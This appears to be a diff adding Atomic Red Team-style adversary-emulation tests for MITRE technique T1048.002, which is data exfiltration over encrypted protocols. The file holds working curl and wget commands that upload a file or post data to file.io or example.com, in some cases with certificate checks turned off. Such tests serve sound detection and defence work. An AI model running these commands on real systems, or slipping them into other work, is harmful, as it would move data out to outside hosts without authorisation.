@@ -1,0 +1,94 @@
+attack_technique: T1048.002
+display_name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+atomic_tests:
+- name: Exfiltrate data HTTPS using curl windows
+  auto_generated_guid: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0
+  description: |
+    Exfiltrate data HTTPS using curl to file share site file.io
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file:
+      description: Test file to upload
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
+    curl_path:
+      description: path to curl.exe
+      type: path
+      default: C:\Windows\System32\Curl.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Curl must be installed on system.
+    prereq_command: |
+      if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+  - description: |
+      #{input_file} must be exist on system.
+    prereq_command: |
+      if (Test-Path "#{input_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{input_file}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact" -OutFile "#{input_file}"
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      #{curl_path} -k -F "file=@#{input_file}" https://file.io/
+- name: Exfiltrate data HTTPS using curl freebsd,linux or macos
+  auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+  description: |
+    Exfiltrate data HTTPS using curl to file share site file.io
+  supported_platforms:
+  - macos
+  - linux
+  input_arguments:
+    input_file:
+      description: Test file to upload
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+- name: Exfiltrate data in a file over HTTPS using wget
+  auto_generated_guid: 7ccdfcfa-6707-46bc-b812-007ab6ff951c
+  description: |
+    Exfiltrate data over HTTPS using wget --post-file method
+  supported_platforms:
+  - linux
+  input_arguments:
+    input_file:
+      description: Test data to upload
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
+    endpoint_domain:
+      description: Endpoint to send data to
+      type: string
+      default: https://example.com/
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      wget --post-file="#{input_file}" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
+- name: Exfiltrate data as text over HTTPS using wget
+  auto_generated_guid: 8bec51da-7a6d-4346-b941-51eca448c4b0
+  description: |
+    Exfiltrate data over HTTPS using wget --post-data method
+  supported_platforms:
+  - linux
+  input_arguments:
+    endpoint_domain:
+      description: Endpoint to send data to
+      type: string
+      default: https://example.com/
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
